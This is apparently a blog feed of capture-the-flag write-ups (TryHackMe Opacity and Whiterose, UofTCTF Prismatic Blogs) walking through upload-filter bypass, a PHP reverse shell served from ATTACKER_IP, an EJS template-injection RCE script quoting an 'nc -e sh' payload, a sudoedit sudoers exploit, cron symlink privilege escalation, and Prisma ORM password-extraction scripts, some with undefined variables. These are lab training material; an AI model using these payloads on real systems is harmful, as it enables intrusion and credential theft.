[
  
  {
    "title": "Opacity",
    "url": "/posts/thm-opacity/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, web, php, file-upload, pwncat, linux-privesc",
    "date": "2025-01-02 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Opacity, an Easy rated room on TryHackMe. We will explore the exploitation of the File Upload vulnerability , before moving on to the p...",
    "content": "IntroductionHello everyone, today we will be taking a look at Opacity, an Easy rated room on TryHackMe. We will explore the exploitation of the File Upload vulnerability , before moving on to the privilege escalation phase. Let’s get started !  Enumeration          Portscan      HTTP (80)                  Directory Fuzzing          /cloud/                      Exploitation          Testing file upload      Bypassing the filter      RCE        Privesc          Manual privesc      Sysadmin      Gaining root                  Theory          Practice                    Root      EnumPortscanLet’s start with a basic portscan. As always I to go with rustscan, cause it’s pretty fast, specifying service version and output normal options for the subsequent nmap scan:rustscan -a $TARGET -- -sV -oN all_ports.txtPORT    STATE SERVICE     REASON  VERSION22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))139/tcp open  netbios-ssn syn-ack Samba smbd 4445/tcp open  netbios-ssn syn-ack Samba smbd 4What do we learn from this portscan ?  The target is likely running linux  SSH, HTTP, and SMB are runningSMB (139, 445)I always start by enumerating file sharing protocols because they often contain juicy. I like to use enum4linux when enumerating samba, to make sure I don’t miss anything.enum4linux $TARGET\tSharename       Type      Comment\t---------       ----      -------\tprint$          Disk      Printer Drivers\tIPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))[+] Attempting to map shares on 10.10.151.131//10.10.151.131/print$\tMapping: DENIED Listing: N/A Writing: N/A//10.10.151.131/IPC$\tMapping: N/A Listing: N/A Writing: N/AThese are two default shares, and we don’t have access to them. Let’s move on.HTTP (80)Website index pageInteresting ! Maybe we could try bruteforcing the login form, or identifying an SQL injection later. Since we’re still in the enumeration phase, let’s not rush things.Directory fuzzingTime for some directory fuzzing I guess. I’ll use ffuf, and go with the directory-list2.3-medium from SecLists to make sure we don’t miss any hidden directories:ffuf -u \"http://10.10.151.131/FUZZ\" \\     -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt {: .radius-shadow }/cloud/Let’s access it from our browser:I’m pretty sure that there’s a file upload vulnerability in here. Let’s try to exploit it !ExploitTesting file uploadAlright, so basically, here’s how the application works:  We provide a link to an image.  It downloads the image and displays it.The first think I wan’t to check is giving a link to an image that doesn’t exist. For example let’s try to enter .png:Seems like there’s no check to verify if the image actually exists. Let’s try uploading .php then.And … The webapp refuses to upload it. So there is probably some kind of filter checking the extension but I don’t know exactly how. Let’s try uploading some real files to see how the webserver responds.So first thing first I launch an http server with python to serve filesmkdir ~/Pictures/Chrootcd ~/Pictures/Chrootpython3 -m http.server 80In the same directory (~/Pictures/Chroot), I create a file named phpinfo.php&lt;?php echo phpinfo();?&gt;Then, I copy it, creating multiple versions with multiple extensions:cp phpinfo.php phpinfo.php.png # Double extension that ends with an image extensioncp phpinfo.php phpinfo.png.php # Double extension that ends with the PHP extensionI tried uploading the .png.php (by giving this url to the webapp: http://ATTACKER_IP/phpinfo.png.php), but it didn’t work.Next I tried the .php.png (by giving this url to the webapp: http://ATTACKER_IP/phpinfo.php.png), It uploaded it but when trying to access it:Bypassing the filterRecently, I was watching a youtube video from John Hammond where he was exploiting an LFI. To bypass a filter, he used a strange filter evasion technique with the #.  The # in a URL is used to denote an anchor or fragment identifier. This tells the browser to navigate to a specific part of the page, typically an element with a corresponding id.I thought: could be a good idea to try.http://ATTACKER_IP/phpinfo.php#.pngPHP code execution!!! Let’s leverage this into a full RCE. And a shoutout to John Hammond.RCEFirst things first I set up a pwncat listener on port 9999.Then I grabbed the pentest monkey’s PHP reverse shell. I modified the IP and the PORT to match mine, placed it in the directory where my HTTP server is running (~/Pictures/Chroot/), and renamed it rev.php. Finally I asked the webapp to load this “image” :http://ATTACKER_IP/rev.php#myfile.pngAs you can see the webapp downloads the rev.php file from my HTTP server and tries to display it. Since it’s a PHP file, it gets interpreted by the web server, and I get my reverse shell !PrivescManual privescI was just poking aroung, looking at common directories, and I found this:(remote) www-data@opacity:/$ cd /opt(remote) www-data@opacity:/opt$ lsdataset.kdbxThis looks like a KeyPass password database ! Let’s download it on our machine.Exfiltrating the KDBX fileUnfortunately this type of file is protected by a password (called “master key”). Fortunately, we can crack it using keepass2john and johnCracking it with johnAll that’s left is to open the KeePass file, input the master key, and steal the protected passwords.Inputing the master key and stealing the passwordsysadmin : Cl0udP4ss40p4city#8700Sysadmin(remote) www-data@opacity:/$ ls /homesysadminSysadmin is a user on this host.(remote) www-data@opacity:/opt$ su sysadminPassword: Cl0udP4ss40p4city#8700sysadmin@opacity:/opt$I tried automatic enumeration with LinPEAS but it didn’t find anything. So, I checked in the sysadmin’s home directory and found a backup script:sysadmin@opacity:~/scripts$ ls -R ..:lib  script.php./lib:application.php  bio2rdfapi.php      dataresource.php  fileapi.php  phplib.php  registry.php  xmlapi.phpbackup.inc.php   biopax2bio2rdf.php  dataset.php       owlapi.php   rdfapi.php  utils.phpAll these files are owned by root. Let’s take a look at the script.php code (here’s a simplified version):&lt;?php//Backup of scripts sysadmin folderrequire_once('lib/backup.inc.php');zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');//Files scheduled removal$dir = \"/var/www/html/cloud/images\";foreach ( files_of($dir) as $file ) {    if($file-&gt;isDir())         rmdir($file);    else:        unlink($file);}?&gt;Alright, so this script basically does two things  zip /home/sysadmin/scripts in /var/backups/backup.zip  delete all images in /var/www/html/cloud/imagesRemember earlier ? The website’s name was 5 minutes upload. That means that root probably executes (via a cronjob or something) the script.php every 5 minutes.To escalate privileges we could simply modify the lib/backup.inc.php file, inject some malicious code, wait 5 minutes and ggs.sysadmin@opacity:~/scripts$ echo &gt; lib/backup.inc.phpbash: scripts/lib/backup.inc.php: Permission deniedsysadmin@opacity:~/scripts$ echo &gt; lib/whatever.phpsysadmin@opacity:~/scripts$ But here is the problem. We can’t write to lib/backup.inc.php (cause it’s owned by root). However we can create files in lib/. So I thought: if we could somehow delete lib/backup.inc.php, we could then create a new one with malicious code, wait 5 minutes, and gain root privileges.But the question is how do we delete it ?Gaining rootTheoryWhile reading the PHP doc for unlink I found this interesting detail:  If the file is a symlink, the symlink will be deleted.If /var/www/html/cloud/images/ was a symlink to ~/scripts/lib/, then when root tries to delete all files from /var/www/html/cloud/images, unlink would follow the symlink, so root would in fact delete all files in ~/scripts/lib/.At that point I’d be able to create a malicious ~/scripts/lib/backup.inc.php. After 5 minutes, root would execute ~/scripts/script.php, including our malicious library, and gg.PracticeHere’s the process I followed step-by-step to set up the symlink and get root to delete their own files. First I need to be www-data (cause it have own on /var/www/html/cloud/).# Step 1: Make sure `sysadmin` can create the symlink herewww-data@opacity:~/opt$ chmod 777 /var/www/html/cloud/# Step 2: Remove the existing images/ directory.www-data@opacity:~/opt$ rm -rf /var/www/html/cloud/images# Step 3: Switch to the sysadmin user to create the symlink.www-data@opacity:~/opt$ su sysadminPassword: Cl0udP4ss40p4city#8700# Step 4: Navigate to the sysadmin's home directory.sysadmin@opacity:~/opt$ cd /home/sysadmin# Step 5: Create the symlink we discussed earlier.sysadmin@opacity:~/home/sysadmin$ ln -sf /home/sysadmin/scripts/lib /var/www/html/cloud/images# Step 6: Verify the contents of the lib directory.sysadmin@opacity:~/home/sysadmin$ ls scripts/lib application.php  bio2rdfapi.php      dataresource.php  fileapi.php  phplib.php  registry.php  whatever.phpbackup.inc.php   biopax2bio2rdf.php  dataset.php       owlapi.php   rdfapi.php  utils.php     xmlapi.php# Step 7: Wait for 5 minutes for the cron job to execute.# Step 8: Verify that root has deleted their own files.sysadmin@opacity:~/home/sysadmin$ ls scripts/lib# files are gone!Nice !And now, all that’s left is to create a malicious ~/scripts/lib/backup.inc.php.# Step 1: Trick root into setting the SUID bit on /bin/bash. sysadmin@opacity:~/home/sysadmin$ echo '&lt;?php shell_exec(\"chmod +s /bin/bash\"); ?&gt;'# Step 2: Verify the current permissions of /bin/bash.sysadmin@opacity:~/home/sysadmin$ ls -l /bin/bash-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash# Step 3: Wait for 5 minutes for the cron job to execute.# Step 4: Check the permissions of /bin/bash again.sysadmin@opacity:~/home/sysadmin$ ls -l /bin/bash-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash# The SUID bit has been set by root!RootTo gain root access we need to execute /bin/bash with the -p option  If the -p option is supplied at invocation, the effective user id is not reset.This means we retain our UID, GID, and all related attributes, but the EUID (Effective User ID) and EGID (Effective Group ID) are NOT reset to ours. Since it’s an SUID binary, they are set to the UID/GID of the owner (root).With this, we can execute commands as root:"
  },
  
  {
    "title": "Introduction",
    "url": "/posts/uofctf-introduction/",
    "categories": "Writeups, UofTCTF2025",
    "tags": "writeups",
    "date": "2025-01-01 16:00:00 +0000",
    





    
    "snippet": "UofTCTF 2025 is the annual capture-the-flag competition organized by the UofTCTF team. This year’s event took place online from January 10, 2025, at 7:00 PM EST to January 12, 2025, at 7:00 PM EST....",
    "content": "UofTCTF 2025 is the annual capture-the-flag competition organized by the UofTCTF team. This year’s event took place online from January 10, 2025, at 7:00 PM EST to January 12, 2025, at 7:00 PM EST. It was a jeopardy-style CTF with classic categories like web, pwn, crypto, rev, forensics, and misc.   Link to the event I managed to finish 161 on 897 solo with my this CTFtime team … Not really a team since I’m the only member !"
  },
  
  {
    "title": "Whiterose",
    "url": "/posts/thm-whiterose/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, web, subdomain-fuzzing, idor, ssti, ejs, scripting, linux-privesc",
    "date": "2025-01-01 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Whiterose, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Express.js webapp through IDOR and SSTI, b...",
    "content": "IntroductionHello everyone, today we will be taking a look at Whiterose, an Easy rated room on TryHackMe. We will explore the exploitation of a vulnerable Express.js webapp through IDOR and SSTI, before moving on to the privilege escalation phase. Let’s get started !  Enumeration          Portscan      HTTP (80)                  Directory Fuzzing          Virtual Host fuzzing          Admin Subdomain                          User access              Admin access                                Identifying the template engine          Looking for vulnerabilities                      Exploitation          CVE-2024-33883      CVE-2023-29827      CVE-2022-29078                  Writing a scripting          Getting RCE                      Privesc          sudo -l      Sudoedit      EnumPortscanLet’s start with a basic portscan. I like to go with rustscan cause it’s quite fast. As always, I go with service version enumeration and output normal options:rustscan -a $TARGET -- -sV -oN all_ports.txt22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.14.0 (Ubuntu)What do we learn from this portscan ?  The target is likely running linux  SSH and HTTP are runningHTTP (80)Usually, SSH isn’t a primary target in CTFs, unlike HTTP, so let’s start with that.It’s trying to redirect us to a domain.I added this domain to my /etc/hosts file with this bash one-liner:sudo bash -c 'echo \"10.10.181.178 cyprusbank.thm\" &gt;&gt; /etc/hosts'Accessing the index page of the new domain.But still nothing interesting.Directory FuzzingI thought maybe trying some directory fuzzing could be a good idea.You can use whatever tool you like (gobuster, dirbuster, dirb…). I’ll go with ffuf:ffuf -u \"http://cyprusbank.thm/FUZZ\" -w /usr/share/wordlists/common.txtindex.html              [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 368ms]ffuf -u \"http://cyprusbank.thm/FUZZ\" -w /usr/share/wordlists/big.txt// nothing foundI tried the common.txt and big.txt wordlists from dirb, but I still didn’t find anything.Virtual Host fuzzingSince we have a domain name, trying virtual host fuzzing might be a good idea. I’ll go with wfuzz but you can use ffuf or gobuster as mentioned in the article.wfuzz -u cyprusbank.thm -H \"Host: FUZZ.cyprusbank.thm\" \\      -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txtGetting the number of words in the response.As you may have noticed, wfuzz shows a different number of words in the response depending on whether the tested domain is an existing virtual host or not. Since we know that a non-existent subdomain returns 3 words, we can ask wfuzz to hide all the responses that contain 3 wordswfuzz -u cyprusbank.thm -H \"Host: FUZZ.cyprusbank.thm\" \\      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\      --hw 3 Hiding responses that contains 3 words.Admin SubdomainOkay, so wfuzz found 1 new interesting subdomain (since www is usually not interesting). Let’s add it to our /etc/hosts file:sudo bash -c 'echo \"10.10.181.178 admin.cyprusbank.thm\" &gt;&gt; /etc/hosts'And access it from our browser:Finally !User accessThe challenge says  And oh! I almost forgot! - You will need these: Olivia Cortez:olivi8These credentials are probably provided so we can log in here. After logging in as Olivia Cortez, we are greeted with this page:After clicking around and exploring the website, I made this table:            Page name      What does it do      Potential vulnerabilities                  /      Show recent payments      N/A (static page)              /search      Search for a bank account      searchbar → XSS,SQLI,SSTI              /settings      We don’t have permissions      N/A              /messages/?c=INT      Show/Send messages      c=INT  → IDOR, SQLI                            chat → SSTI,XSS,SQLi      Since we’re still in the enumeration phase let’s focus on testing the IDOR for now.Here is the /message page:The url carries a query parameter named c, with a default value of 5. Let’s test if it’s vulnerable to an IDOR by incrementing this number. I’ll set it to 1000:Gayle Bev:p~]P@5!6;rs558:qAdmin accessAfter logging in with these credentials, I tried accessing the /settings page.I attempted to change the password of some accounts, but it didn’t work. This probably means we HAVE to exploit this page (the authors wouldn’t have created/protected it with admin privilegess otherwise) but via other vectores.I tried some XSS payloads, but they didn’t work. I also tried SQLmap to check for SQL injection but found nothing. I was quite certain it was an SSTI. So, I started looking around to try to identify the template engine.We know that the backend is written using Express.jsIdentifying the template engineAfter a quick googling search I found this on the Express.js documentation:  The Express application generator uses Pug as its default, but it also supports Handlebars, and EJS, among others.That’s not really helpful … We need to know which template engine is used before exploiting it. So I thought: could we make it crash somehow ? Let’s try submitting the form at /settings without supplying any data (no name, no password).curl -X POST http://admin.cyprusbank.thm/settings \\    --cookie \"connect.sid=s%3AJMq02Cp0CBuP_l8pVqYiIbELNrOjtj_5.nIQtTw015tEtvp2t8PbD%2BDIU%2BQQjebdpolEfR6B7zwM\" \\    -d \"\"&lt;div class=\"alert alert-info mb-3\"&gt;Please enter a valid name&lt;/div&gt;There is probably an initial filter that says, “If there is no name, show this div and exit”. Therefore, we need to provide a name to bypass this first check:curl -X POST http://admin.cyprusbank.thm/settings \\    --cookie \"connect.sid=s%3AJMq02Cp0CBuP_l8pVqYiIbELNrOjtj_5.nIQtTw015tEtvp2t8PbD%2BDIU%2BQQjebdpolEfR6B7zwM\" \\    -d \"name=a\" I use the http command from httpie for the screenshot cause it has cool syntax highlighting that makes the output more readableWe know that it’s EJS, let’s try to find some CVEs !Looking for vulnerabilitiesI looked for EJS on cve.mitre.org and found a few interesting CVEs:EJS cve’s            CVE      Type      Link                  CVE-2024-33883      Prototype pollution      cve.org              CVE-2023-29827      SSTI      cve.org              CVE-2022-29078      SSTI      cve.org              CVE-2017-1000228      RCE      cve.org      ExploitationCVE-2024-33883After searching a bit I found this poc that states:  Attack available condition      Needs control of render().    Needs control of prototype pollution attack vector.              Above two condition holds, RCE attack is available.            I don’t think we have control of a prototype pollution attack vector. It’s an easy room, searching for a prototype pollution in an easy room seems highly improbable. Let’s move on.CVE-2023-29827After searching for POCs on github I came across this repo, the author says that there is no POC for this CVE. Let’s move on.CVE-2022-29078On the CVE Program section of the CVE.org page, there is a link pointing to a blog post of the guy who found the CVE. I read it and thought let’s give it a try.Writing a scriptSo I wrote a POC in python:from requests import Sessionfrom sys import argvdef main(url=\"http://admin.cyprusbank.thm\",          username=\"Gayle Bev\",          password=\"p~]P@5!6;rs558:q\"):    session = Session()    command = argv[1]    # Login    session.post(f\"{url}/login\", data={        \"username\": username,        \"password\": password,    })    # In this page: https://eslam.io/posts/ejs-server-side-template-injection-rce/    # we see this payload: http://localhost:3000/page?id=2&amp;settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc -e sh 127.0.0.1 1337');s    # It is used with the GET method. Let's adapt it for the POST method:    # Sending the malicious post request    print(session.post(f\"{url}/settings\", data={        \"name\": \"a\",         \"password\": \"a\",         \"settings[view options][outputFunctionName]\": f\"x;process.mainModule.require('child_process').execSync('{command}');s\"    }).text)if __name__ == \"__main__\":    if(len(argv) == 1):        print(f\"[!] Usage: {argv[0]} &lt;COMMAND&gt;\")        exit()            main()Getting RCEFirst we need to validate that the running EJS version is affected by this CVE:Testing to send the output of ls through netcatCool ! We have an RCE, and we know that netcat is working. Let’s try to get a reverse shell with netcat then:And we have initial accessPrivescI always start with manual privesc, then run automated scripts. I start with the basics, like sudo -l, searching for SUID binaries, and so on. You can find more in-depth manual privesc techniques for Linux heresudo -lSudoeditAfter some googling, I found an interesting exploit that affects sudoedit:Here is the interesting part of the poc (foundable here):EXPLOITABLE=$(sudo -l | grep -E \"sudoedit|sudo -e\" | grep -E '\\(root\\)|\\(ALL\\)|\\(ALL : ALL\\)' | cut -d ')' -f 2-)EDITOR=\"vim -- /etc/sudoers\" $EXPLOITABLEsudo su rootThe script tries to identify which command we’re allowed to run with sudo privileges, then run vim -- /etc/sudoers the_extracted_command. I tried running the script, but it didn’t work … Let’s do it manually:EDITOR=\"vim -- /etc/sudoers\" sudoedit /etc/nginx/sites-available/admin.cyprusbank.thmAnd it worked ! It opened the sudoers file, which I edited as follows:Giving the web user permission to run bash as root.And we’re root !"
  },
  
  {
    "title": "Prismatic Blogs",
    "url": "/posts/UofTCTF2025-prismatic/",
    "categories": "Writeups, UofTCTF2025",
    "tags": "writeups, web, json-injection, orm-injection, prisma",
    "date": "2025-01-01 16:00:00 +0000",
    





    
    "snippet": "  Source Code          Interesting points      Identifying vulnerabilities        Exploitation          Exploiting the vulnerability      Scripting (case unsensitive)      Scripting (case sensitive...",
    "content": "  Source Code          Interesting points      Identifying vulnerabilities        Exploitation          Exploiting the vulnerability      Scripting (case unsensitive)      Scripting (case sensitive)      Getting the flag        Code          Final script      Application Source code                  Seed.js          Index.js          Schema.prisma                    Source CodeYou can read the source code hereInteresting PointsAfter reading the source I noticed some interesting things:  Seed.js:          There are 4 users (White, Bob, Tommy and Sam) with random generated passwords      We have the set of character used to make their passwords      Flag is a private post of random(White, Bob, Tommy, Sam)        Index.js:          Our query is directly passed to Prisma without sanitization in /api/posts      Only 2 routes (/api/posts and /api/login)      You can see all posts (EXCEPT unpublished ones) in /api/posts      You can see all posts (EVEN unpublished ones) written by the author after login in /api/login      So we can either:  Try to “hack” the SQL query to display unpublished posts  Try to “hack” the accounts to login and see their postsIdentifying vulnerabilitiesI was looking at the /api/posts code:let query = req.query;query.published = true;let posts = await prisma.post.findMany({where: query});res.json({success: true, posts})Our query is taken, then the published parameter is passed to true, so in the SQL query a WHERE published = true will be added. I tried googling around, but it seems that we can’t bypass that to display the flag …BUT there’s still a problem ! The user query is directly passed to prisma without any sanitization. It means that we can send JSON through the URL to trick the ORM ! After reading the prisma doc I made this url:  http://TARGET_URL/api/posts?author[name]=BobThe query string will be translated to this JSON:\"author\": {    \"name\": \"Bob\"}So JavaScript will execute this ORM request:let posts = await prisma.post.findMany({ where: {    \"author\": {        \"name\": \"Bob\"    },    \"published\": true}});We basically have control over the where condition, we can put whatever we wan’t in it !We can show posts associated to Bob for example !ExploitationExploiting the vulnerabilityOk but what next ?Reading the Prisma doc we find a lot of interesting operators that we could use. We know (from the Schema.prisma) that each post is associated with a user (the author), and that this user have a password. We could simply try to exfiltrate this password from the posts table by taking the author, then grabbing it’s password. Let’s use the startsWith operator for example:  http://TARGET_URL/api/posts?author[name]=Bob&amp;author[password][startsWith]=aThat’ll be translated to:\"author\": {    \"name\": \"Bob\",    \"password\": {        \"startsWith\": \"a\"    }}resulting in this Prisma query:let posts = await prisma.post.findMany({     where: {        author: {            name: \"Bob\",            password: {                startsWith: \"a\"            }        },        \"published\": true    }});As you can see, nothing is returned, that means that the Bob’s password don’t start with a. I tried b, c, d … And got a hit with 8, meaning that Bob’s password starts with 8 !So now we can try 8a, 8b, 8c and so on … Let’s automate this with python.Scripting (case unsensitive)So I wrote this simple scriptfrom requests import getfrom pwn import log # Set of character used (read the seeder.js file)chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"# One of the four usersusername=\"Bob\"passw = \"\"# We know that the password is maximum 24 char (see seed.js)for i in range(24):\t# Go through every possible char of the set of character\tfor char in chars:\t\t# Make the url\t\turl = f\"http://TARGET_URL/api/posts?author[name]={username}&amp;author[password][startsWith]={passw+char}\" \t\treq = get(url)\t\tlog.info(f\"trying : {passw+char}\")\t\t# If something is returned, that means that it's the correct char\t\tif(len(str(req.json()[\"posts\"])) &gt; 10):\t\t\tpassw += char\t\t\tlog.success(\"FOUND: \" + passw)\t\t\tbreak\telse:\t\tlog.success(\"FINAL: \" + passw)I launched the script, waited a bit …After a few minutes (yes my network is that bad …) the script told me “Bob’s password is 8AXCGMISH5ZN59RSXJM !”. So let’s try to login to the /api/login endpoint with it !Did you noticed something ? There is no lowercases in our password. So I guess the startsWith and endsWith are case-insensitive.Let’s try a different operator:When I put equals, it doesn’t return anything ! So I guess equals is case-sensitive as well as the /api/login endpoint ! We need to find a way to detect if each character is lowercase or uppercase, but how ?Scripting (case sensitive)Fortunately we can put whatever we wan’t in the were clause cause there is no sanitization… So basically we have an SQL query with WHERE X AND published=true and the X is entirely controlled by us ! And fortunately, prisma comes with a ton of operator. To mitigate the case-insne… insin… The case that is not sensitive problem, we can use the gt (greater than) and lt (lower than) operators !Using this request we can test wether the character is lowercase or uppercase:  http://TARGET_URL/api/posts?author[name]=Bob&amp;author[password][gt]=8a&amp;author[password][lt]=8zThat will be converted to\"author\": {\t\"name\": \"Bob\",\t\"password\": {\t\t\"gt\": \"8a\",\t\t\"lt\": \"8z\"\t}}Let’s take a look:Check if the character is between a and z (check if the character is lowercase)Check if the character is between A and Z (check is the character is uppercase)As you can see the second request returns something, that means that the z character is between A and Z. Therefore, it’s uppercase.We can repeat the operation for every character. So I scripted it:from requests import getfrom pwn import log log.warning(\"Gathering case sensitivity\")passw = \"8AXCGMISH5ZN59RSXJM\"username = \"Bob\"to_test = \"\"for char in passw:\tif(char in numbers):\t\tto_test += char\t\tcontinue\tis_lower_url = f\"http://TARGET_URL/api/posts?author[name]={username}&amp;author[password][gt]={to_test}a&amp;author[password][lt]={to_test}z\"\tlog.info(f\"trying : {to_test}\")\tis_lower = get(is_lower_url)\tif(len(str(is_uppercase.json()[\"posts\"])) &gt; 10):\t\tto_test += char.lower()\telse:\t\tto_test += char.upper()log.success(\"Password with correct case is: \" + to_test)Launch it:Let’s go !Getting the flagAnd we get the flag !  But how did you know that Bob had the flag ?Actualy I didn’t, I started by bruteforcing the password of White (first user on the seeder), didn’t find the flag, then I moved on to Bob (second user on the seeder) and the flag was here !uoftctf{u51n6_0rm5_d035_n07_m34n_1nj3c710n5_c4n7_h4pp3n}CodeScriptHere is the final scripts:from requests import getfrom sys import argvfrom pwn import log if(len(argv) != 2):\tlog.critical(f\"Usage: {argv[0]} &lt;USERNAME&gt;\")\texit()# Set of character used (read the seeder.js file)chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"# The username to attack four usersusername = argv[1]passw = \"\"log.warning(\"Gathering password WITHOUT case-sensitivity\")# We know that the password is maximum 24 char (see seeder.js)for i in range(24):\t# Go through every possible char of the set of character\tfor char in chars:\t\t# Make the url\t\turl = f\"http://TARGET_URL/api/posts?author[name]={username}&amp;author[password][startsWith]={passw+char}\" \t\treq = get(url)\t\tlog.info(f\"trying : {passw+char}\")\t\t# If something is returned, that means that it's the correct char\t\tif(len(str(req.json()[\"posts\"])) &gt; 10):\t\t\tpassw += char\t\t\tlog.info(\"FOUND (CASE-UNSENSITIVE): \" + passw)\t\t\tbreak\telse:\t\tlog.success(\"FINAL (CASE-UNSENSITIVE): \" + passw)log.info(\"Gathering case ...\")to_test = \"\"for char in passw:\tif(char in numbers):\t\tto_test += char\t\tcontinue\tis_lower_url = f\"http://TARGET_URL/api/posts?author[name]={username}&amp;author[password][gt]={to_test}a&amp;author[password][lt]={to_test}z\"\tlog.info(f\"Trying (case-sensitive) : {to_test}\")\tis_lower = get(is_lower_url)\tif(len(str(is_uppercase.json()[\"posts\"])) &gt; 10):\t\tto_test += char.lower()\telse:\t\tto_test += char.upper()log.success(\"Password with correct case is: \" + to_test)Application Source codeSeed.jsimport { PrismaClient } from \"@prisma/client\";const prisma = new PrismaClient();const FLAG = process.env.FLAG || \"uoftctf{FAKEFLAGFAKEFLAG}\"function generateString(length) {    const characters ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';    let result = '';    const charactersLength = characters.length;    for ( let i = 0; i &lt; length; i++ ) {        result += characters.charAt(Math.floor(Math.random() * charactersLength));    }    return result;}const USERS = [    {        name: \"White\",        password: generateString(Math.floor(Math.random()*10)+15),    },    {        name: \"Bob\",        password: generateString(Math.floor(Math.random()*10)+15),    },    {        name: \"Tommy\",        password: generateString(Math.floor(Math.random()*10)+15),    },    {        name: \"Sam\",        password: generateString(Math.floor(Math.random()*10)+15),    },];const NUM_USERS = USERS.length; // all chatGPT generated cause im lazyconst POSTS = [    {      title: `Why Cybersecurity is Everyone's Responsibility`,      body: `In today's digital age, cybersecurity isn't just an IT concern—it's everyone's responsibility. From clicking suspicious links to using weak passwords, small mistakes can lead to big vulnerabilities. Simple habits like enabling two-factor authentication, updating software, and being mindful of phishing emails can protect not just yourself but your entire organization. Cybersecurity starts with awareness—how are you contributing to a safer digital world?`,      authorId: Math.floor(Math.random()*NUM_USERS)+1,      published: true    },    {        title: `Boosting Productivity with Time Blocking`,        body: `Struggling to get things done? Time blocking might be your answer. By dividing your day into focused chunks of work, you can minimize distractions and maximize efficiency. Start by identifying your most important tasks, assign specific time slots, and stick to them. Bonus tip: leave buffer time for unexpected interruptions. Time blocking isn’t just about scheduling—it’s about creating space for what truly matters.`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `3 Easy Tips to Save Energy at Home`,        body: `Reducing your energy footprint doesn’t have to be complicated. Start small:Switch to LED bulbs—they last longer and use less power.Unplug electronics when not in use—they still draw power even when off.Use a programmable thermostat to optimize heating and cooling.These simple changes save money and help the planet—win-win!`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `How to Start Your Fitness Journey Today`,        body: `Getting fit can feel overwhelming, but it doesn’t have to be. Start small: commit to a 10-minute walk daily or try a beginner-friendly workout video. Focus on consistency over intensity. Remember, progress takes time, so celebrate small wins along the way. Your future self will thank you for taking that first step today!`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `The Magic of Morning Routines`,        body: `What do successful people have in common? A solid morning routine. Whether it’s journaling, meditating, or a quick workout, starting your day intentionally sets the tone for productivity and positivity. Don’t overthink it—pick one activity that energizes you and stick with it. Mornings are your power hour; how will you use yours?`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `5 Quick Ways to Declutter Your Space`,        body: `A cluttered space can lead to a cluttered mind. Here’s how to simplify:Apply the “one in, one out” rule for new purchases.Dedicate 10 minutes a day to tidying up.Donate items you haven’t used in a year.Invest in smart storage solutions.Remember: less is more.Decluttering isn’t just about cleaning—it’s about creating a space that inspires calm and focus.`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `Why Soft Skills Are the Secret to Career Growth`,        body: `Technical skills may get your foot in the door, but soft skills will take you further. Communication, adaptability, and emotional intelligence are increasingly valued in today’s workplace. Why? Because they foster collaboration and help you navigate challenges effectively. Want to stand out in your career? Work on your soft skills—they’re just as crucial as hard ones.`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `3 Reasons You Should Start Journaling`,        body: `Feeling overwhelmed? Journaling might be the outlet you need. It helps you:Clarify your thoughts and emotions.Track personal growth and progress.Spark creativity by putting ideas to paper.You don’t need fancy notebooks or hours of time—just a few minutes a day can make a big difference. Start writing and see where it takes you!`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `How to Beat Procrastination for Good`,        body: `Procrastination affects us all, but overcoming it is possible. Start by breaking tasks into smaller, manageable chunks. Use techniques like the Pomodoro timer to stay focused, and reward yourself for completing milestones. Most importantly, don’t aim for perfection—progress is what counts. The best time to start? Right now.`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `The Future of Remote Work`,        body: `The shift to remote work has changed the way we view the workplace. Flexibility and work-life balance are now top priorities for employees, while companies are investing in tools to keep teams connected. But with this freedom comes challenges—like maintaining productivity and avoiding burnout. The future of work is hybrid, but how can we make it truly sustainable for everyone?`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: true    },    {        title: `The Flag`,        body: `This is a secret blog I am still working on. The secret keyword for this blog is ${FLAG}`,        authorId: Math.floor(Math.random()*NUM_USERS)+1,        published: false    }];(async () =&gt; {    await prisma.user.createMany({data: USERS});    await prisma.post.createMany({data: POSTS});  })();Index.jsimport express from \"express\";import { PrismaClient } from \"@prisma/client\";const app = express();app.use(express.json())const prisma = new PrismaClient();const PORT = 3000;app.get(  \"/api/posts\",  async (req, res) =&gt; {    try {      let query = req.query;      query.published = true;      let posts = await prisma.post.findMany({where: query});      res.json({success: true, posts})    } catch (error) {      res.json({ success: false, error });    }  });app.post(    \"/api/login\",    async (req, res) =&gt; {        try {            let {name, password} = req.body;            let user = await prisma.user.findUnique({where:{                    name: name                },                include:{                    posts: true                }            });            if (user.password === password) {                 res.json({success: true, posts: user.posts});            